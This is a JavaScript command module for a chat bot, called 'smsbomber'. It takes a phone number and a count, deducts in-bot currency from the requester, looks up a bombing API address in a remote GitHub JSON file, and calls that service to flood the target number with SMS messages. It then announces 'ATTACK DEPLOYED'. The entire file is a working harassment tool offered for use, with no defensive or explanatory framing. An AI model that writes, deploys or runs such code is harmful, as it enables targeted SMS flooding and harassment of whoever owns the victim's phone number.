const axios = require("axios");

const RATE_PER_SMS = 10; 
const RAW_JSON_URL = "https://raw.githubusercontent.com/goatbotnx/Sexy-nx2.0Updated/refs/heads/main/nx-apis.json";

module.exports = {
  config: {
    name: "smsbomber", 
    aliases: ["bomb", "sms"], 
    version: "10.0",
    author: "xalman", 
    role: 0,
    countDown: 10,
    shortDescription: "Premium SMS Bomber",
    longDescription: "High-speed SMS bombing with dynamic billing.",
    category: "premium",
    guide: {
      en: "{pn} [phone] [amount]"
    }
  },

  onStart: async function ({ api, event, message, usersData, args }) {
    const { threadID, messageID, senderID } = event;
    const phone = args[0];
    const userCount = parseInt(args[1]) || 10;

    if (!phone || phone.length < 11 || isNaN(phone)) {
      api.setMessageReaction("❓", messageID, () => {}, true);
      return message.reply(`╭─────────────╮\n       ⚠️  𝗜𝗡𝗩𝗔𝗟𝗜𝗗 𝗨𝗦𝗔𝗚𝗘  ⚠️\n╰─────────────╯\n\n💡 𝗨𝘀𝗮𝗴𝗲: /bomb [phone] [count]\n💰 𝗖𝗼𝘀𝘁: ${RATE_PER_SMS} TK per SMS`);
    }

    const totalCost = userCount * RATE_PER_SMS;
    const serverCount = userCount * 2; 

    api.setMessageReaction("⏳", messageID, () => {}, true);

    try {
      const userData = await usersData.get(senderID);
      const balance = userData?.money || 0;

      if (balance < totalCost) {
        api.setMessageReaction("❌", messageID, () => {}, true);
        return message.reply(`╭─────────────╮\n       🚫  𝗟𝗢𝗪 𝗕𝗔𝗟𝗔𝗡𝗖𝗘  🚫\n╰─────────────╯\n\n❌ Insufficient balance.\n\n💵 Your Balance: ${balance} TK\n💸 Required: ${totalCost} TK`);
      }

      await usersData.set(senderID, { money: balance - totalCost });
      
      message.reply(`💸 𝗣𝗮𝘆𝗺𝗲𝗻𝘁 𝗖𝗼𝗻𝗳𝗶𝗿𝗺𝗲𝗱!\n━━━━━━━━━━━━━━━━━━\n✅ ${totalCost} TK Deducted\n💰 Remaining: ${balance - totalCost} TK\n\n⚡ 𝗦𝗲𝗿𝘃𝗲𝗿 𝗶𝘀 𝗥𝗲𝘀𝗽𝗼𝗻𝗱𝗶𝗻𝗴...`);

      const jsonRes = await axios.get(RAW_JSON_URL);
      const bomberBaseUrl = jsonRes.data.bomb;

      if (!bomberBaseUrl) throw new Error("API URL not found");

      const res = await axios.get(`${bomberBaseUrl}/api?phone=${phone}&count=${serverCount}`);

      if (res.data.status === "success") {
        api.setMessageReaction("🔥", messageID, () => {}, true);
        
        return message.reply({
          body: `🚀  𝗔𝗧𝗧𝗔𝗖𝗞  𝗗𝗘𝗣𝗟𝗢𝗬𝗘𝗗  🚀\n━━━━━━━━━━━━━━━━━━\n📱 𝗧𝗮𝗿𝗴𝗲𝘁: ${phone}\n🔢 𝗔𝗺𝗼𝘂𝗻𝘁: ${userCount}\n📡 𝗦𝘁𝗮𝘁𝘂𝘀: Sending SMS...\n━━━━━━━━━━━━━━━━━━`
        });
      }

    } catch (err) {
      console.error(err);
      api.setMessageReaction("⚠️", messageID, () => {}, true);
      return message.reply("❌ 𝗦𝗲𝗿𝘃𝗲𝗿 𝗘𝗿𝗿𝗼𝗿! Please try again later.");
    }
  }
};
